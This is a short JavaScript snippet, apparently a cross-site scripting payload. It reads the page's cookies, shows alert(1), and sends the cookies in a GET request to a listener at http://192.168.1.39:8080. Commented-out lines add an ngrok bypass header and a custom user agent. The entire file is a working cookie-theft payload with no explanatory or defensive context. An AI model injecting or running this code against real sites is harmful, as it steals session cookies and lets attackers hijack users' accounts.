let a = document.cookie;                                                             
console.log("cookie:", a);                                                                                    
alert(1)                                                                                                   
                                                                                                            
var xhr = new XMLHttpRequest();                                                                         
xhr.open('GET', 'http://192.168.1.39:8080/?cookie=' + a);                     
                                                                                                           
//xhr.setRequestHeader("ngrok-skip-browser-warning", "true");                                                 
//xhr.setRequestHeader("User-Agent", "Custom User Agent");                                                               
xhr.send();

